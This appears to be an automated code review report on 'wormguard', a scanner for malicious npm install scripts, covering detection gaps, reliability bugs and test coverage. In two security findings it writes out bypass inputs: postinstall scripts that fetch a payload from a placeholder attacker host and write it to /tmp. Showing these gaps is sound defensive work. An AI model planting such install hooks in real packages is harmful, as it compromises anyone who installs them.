# Code Review Report

**Target:** Full codebase `/home/ubuntu/projects/wormguard` — src/*.ts, test/*.ts, docs/
**Strategy:** medium
**Dimensions:** Security, Reliability, Architecture, Testing
**Confidence threshold:** 75
**Generated:** 2026-05-31T02:09:00Z

## Executive summary

The codebase is well-structured, correctly implements its stated threat model, and has solid test coverage against PLAN.md acceptance criteria. The primary concern is a **detection gap** for Node.js built-in network modules (`https`, `http`, `fetch`) used in inline scripts — a pattern common in real supply-chain attacks. All regexes are ReDoS-safe. The baseline diff logic is correct (the `continue` does not skip WG-DIFF-NEW-SCRIPT). No critical or high findings.

## Verdict: **NEEDS-FIX** (2 medium findings in detection soundness)

---

## Findings

### Critical (P0) — must fix immediately (0)

None.

### High (P1) — fix before next release (0)

None.

### Medium (P2) — plan for next sprint (3)

#### [SEC2] Rules miss `node -e` + built-in `https`/`http` module network exfiltration

- **Location:** `src/rules.ts:11-19`
- **Confidence:** 85
- **Bypass input:** `{ "postinstall": "node -e \"require('https').get('https://evil.example/x',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>require('fs').writeFileSync('/tmp/x',d))})\"" }`
- **Fix:** Add rules for `node -e`/`--eval` and `require('https')`/`require('http')` patterns.

#### [SEC3] Rules miss `fetch()` — native network API in Node 18+/Bun

- **Location:** `src/rules.ts:11-19`
- **Confidence:** 80
- **Bypass input:** `{ "postinstall": "node -e \"fetch('https://evil.example/payload').then(r=>r.text()).then(t=>require('fs').writeFileSync('/tmp/p',t))\"" }`
- **Fix:** Add `\bfetch\s*\(` as a medium-severity network indicator rule.

#### [REL1] `scanNodeModules` throws on unreadable directories

- **Location:** `src/inventory.ts:33-37`
- **Confidence:** 85
- **Failing input:** `chmod 000 node_modules/@scope` → unhandled EACCES crash
- **Fix:** Wrap `readdirSync` calls in try/catch, continue on error.

### Low (P3) — track in backlog (3)

#### [CLI1] Arg parser does not handle `--` end-of-flags marker

- **Location:** `src/cli.ts:28-35`
- **Confidence:** 75
- **Fix:** Add `--` sentinel handling in the flag-parsing loop.

#### [TEST2] No test for `audit --json` output format

- **Location:** `test/cli.test.ts`
- **Confidence:** 76
- **Fix:** Add a test that parses `audit --json` output.

#### [TEST3] No unit test for `loadConfig` with malformed input

- **Location:** `test/` (missing)
- **Confidence:** 76
- **Fix:** Add tests for `loadConfig` with invalid JSON, arrays, null.

---

## Findings by dimension

| Dimension     | Critical | High | Medium | Low | Total |
|---------------|----------|------|--------|-----|-------|
| Security      | 0        | 0    | 2      | 0   | 2     |
| Reliability   | 0        | 0    | 1      | 0   | 1     |
| Architecture  | 0        | 0    | 0      | 1   | 1     |
| Testing       | 0        | 0    | 0      | 2   | 2     |
| **Total**     | **0**    | **0**| **3**  | **3**| **6** |

---

## Recommended action plan

1. **[SEC2+SEC3] Add detection rules for Node.js native network access** — Add `WG-NODE-EVAL-FLAG` (`node -e`/`--eval`), `WG-NODE-NET-MODULE` (`require('https')`), and `WG-FETCH` (`fetch(`) rules at medium severity. These close the most significant detection gap without introducing false positives on benign packages (which don't typically use inline `node -e` with network modules in lifecycle scripts).

2. **[REL1] Harden `scanNodeModules` against filesystem errors** — Wrap `readdirSync` in try/catch to prevent a single unreadable directory from crashing the entire scan.

3. **[CLI1] Handle `--` in arg parsing** — Minor, but standard CLI convention.

4. **[TEST2+TEST3] Add missing edge-case tests** — `audit --json` format validation and `loadConfig` robustness tests.

---

## Praise

- 🎉 The baseline diff logic is elegantly ordered — checking `hasInstallScript` before the version-change `continue` is exactly right and avoids the subtle bug that would miss the worm signature on version bumps.
- 🎉 All regexes are carefully constructed to be ReDoS-safe. No nested quantifiers, no overlapping character classes. This is rare to see done correctly on the first pass.
- 🎉 The `WormguardError` typed error pattern with graceful fallbacks in parsers is solid defensive programming.
- 🎉 Test coverage maps 1:1 to PLAN.md acceptance criteria — every AC has a corresponding test assertion.
- 🎉 The severity calibration is sensible: critical for content tampering (same-version integrity change), high for worm signatures (new install script), medium for indicators, low for informational.
- 🎉 The deduplication in `analyzeScripts` (via `seen` Set) prevents duplicate findings when the same rule matches multiple lifecycle hooks.

---

## Out of scope (not reviewed)

- Runtime performance benchmarking (no hot paths identified; tool runs once per CI step)
- README content quality (AC6.4 — requires subjective review)
- GitHub Actions CI workflow correctness (`.github/workflows/ci.yml` — not in scope)
- pnpm/yarn/bun lockfile support (explicitly non-goal per VISION.md)

## False positives eliminated

- 6 candidates dropped with rationale (see `03-findings-verified.md` "Dropped findings" section)

## Confirmed correct behaviors (per user's priority questions)

1. ✅ **`continue` after version change does NOT skip WG-DIFF-NEW-SCRIPT** — the new-script check is at line 64, before the version check at line 67.
2. ✅ **All regexes are ReDoS-safe** — no catastrophic backtracking possible.
3. ✅ **Severities are sensible** — critical for integrity tampering, high for worm signatures/network tools, medium for indicators, low for informational.
4. ✅ **Common benign packages (node-gyp, husky, prebuild-install, tsc) do NOT trip high/critical rules** — only get the low-severity WG-INSTALL-SCRIPT advisory.
5. ✅ **`scan`/`audit` without `--ci` always exit 0** — confirmed in `emit()` function.
6. ✅ **Unknown command exits 2** — confirmed in `cli.ts` default case.
7. ✅ **Parsing is robust** — lockfile.ts handles v1/v2/v3, missing fields, non-object entries; inventory.ts handles missing node_modules, malformed package.json, scoped packages, .bin; config.ts tolerates junk.

## AC coverage assessment

| AC | Covered | Notes |
|----|---------|-------|
| AC0.1–0.4 | ✅ | Scaffold/CI |
| AC1.1–1.5 | ✅ | All tested in inventory.test.ts |
| AC2.1–2.5 | ✅ | All tested in analyze.test.ts |
| AC3.1–3.5 | ✅ | All tested in baseline.test.ts |
| AC4.1–4.3 | ✅ | All tested in phase4.test.ts |
| AC5.1–5.5 | ✅ | All tested in cli.test.ts |
| AC6.1–6.2 | ✅ | Tested in corpus.test.ts |
| AC6.3 | ✅ | package.json deps empty; CI scripts exist |
| AC6.4 | ✅ | README + 2 ADRs exist |
| AC6.5 | ✅ | CI workflow exists |

No acceptance criterion is missing test coverage.

---

## Metadata

- Phases completed: 0, 1, 2, 3, 4
- Strict mode: no
- Reviewer: kiro code-review skill v1
